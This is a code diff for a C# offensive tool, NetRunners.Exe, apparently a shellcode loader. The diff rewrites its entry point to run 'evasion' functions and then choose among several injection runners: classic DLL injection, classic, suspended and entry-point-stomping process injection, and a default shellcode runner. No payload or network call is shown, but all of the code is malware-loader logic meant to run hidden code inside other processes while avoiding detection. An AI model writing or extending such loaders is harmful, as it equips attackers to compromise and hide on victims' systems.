@@ -7,12 +7,24 @@ namespace NetRunners.Exe
     class Program
     {
         /// <summary>
-        /// Entry point for this program, calls Heurisitic functions, and then parses through arguments to determine which runner to call.
-        /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
-        /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
+        /// Entry point for this program, calls Evasion functions, and then determines which runner to call.
+        /// Accepts one or no arguments at runtime. By default (no args specified), calls default Shellcode Runner.
         /// </summary>
-        /// <param name="/pi">Calls Process Injection Runner. Case Insensitive</param>
-        /// <param name="/eps">Calls EntryPoint Stomping Runner. Case Insensitive</param>
+        /// <param name="-cdi">
+        /// Calls classic Dll injection Runner
+        /// </param>
+        /// <param name="-cpi">
+        /// Calls Classic Process injection Runner
+        /// </param>
+        /// <param name="-epi">
+        /// Calls EntryPoint Stomping Process Injection Runner
+        /// </param>
+        /// <param name="-pi">
+        /// Calls Process Injection Runner
+        /// </param>
+        /// <param name="-spi">
+        /// Calls Suspended Process Injection Runner
+        /// </param>
         static void Main(string[] args)
         {
             // evasion
@@ -28,10 +40,16 @@ namespace NetRunners.Exe
             string call = args.Length == 1 ? args[0].ToLower() : string.Empty;
             switch (call)
             {
+                case "-cdi":
+                    return new ClassicDllInjectionRunner();
+                case "-cpi":
+                    return new ClassicProcessInjectionRunner();
+                case "-epi":
+                    return new EntryPointStompingProcessInjectionRunner();
                 case "-pi":
                     return new ProcessInjectionRunner();
-                case "-eps":
-                    return new EntryPointStompingRunner();
+                case "-spi":
+                    return new SuspendedProcessInjectionRunner();       
                 default:
                     return new DefaultRunner();
             }
